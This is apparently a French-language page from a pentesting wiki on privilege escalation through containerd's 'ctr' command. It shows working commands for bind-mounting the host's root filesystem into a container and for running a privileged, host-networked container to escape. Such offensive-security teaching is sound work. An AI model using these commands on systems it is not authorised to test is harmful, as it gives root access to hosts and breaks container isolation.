# Élévation de privilèges Containerd (ctr)

{{#include ../../banners/hacktricks-training.md}}

## Informations de base

Allez au lien suivant pour apprendre **ce qu'est containerd** et `ctr` :

{{#ref}}
../../network-services-pentesting/2375-pentesting-docker.md
{{#endref}}

## PE 1

si vous trouvez qu'un hôte contient la commande `ctr` :
```bash
which ctr
/usr/bin/ctr
```
Vous pouvez lister les images :
```bash
ctr image list
REF                                  TYPE                                                 DIGEST                                                                  SIZE      PLATFORMS   LABELS
registry:5000/alpine:latest application/vnd.docker.distribution.manifest.v2+json sha256:0565dfc4f13e1df6a2ba35e8ad549b7cb8ce6bccbc472ba69e3fe9326f186fe2 100.1 MiB linux/amd64 -
registry:5000/ubuntu:latest application/vnd.docker.distribution.manifest.v2+json sha256:ea80198bccd78360e4a36eb43f386134b837455dc5ad03236d97133f3ed3571a 302.8 MiB linux/amd64 -
```
Et ensuite **exécutez l'une de ces images en montant le dossier racine de l'hôte dessus** :
```bash
ctr run --mount type=bind,src=/,dst=/,options=rbind -t registry:5000/ubuntu:latest ubuntu bash
```
## PE 2

Exécutez un conteneur avec des privilèges et échappez-vous.\
Vous pouvez exécuter un conteneur privilégié comme :
```bash
ctr run --privileged --net-host -t registry:5000/modified-ubuntu:latest ubuntu bash
```
Ensuite, vous pouvez utiliser certaines des techniques mentionnées dans la page suivante pour **vous échapper en abusant des capacités privilégiées** :

{{#ref}}
docker-security/
{{#endref}}

{{#include ../../banners/hacktricks-training.md}}
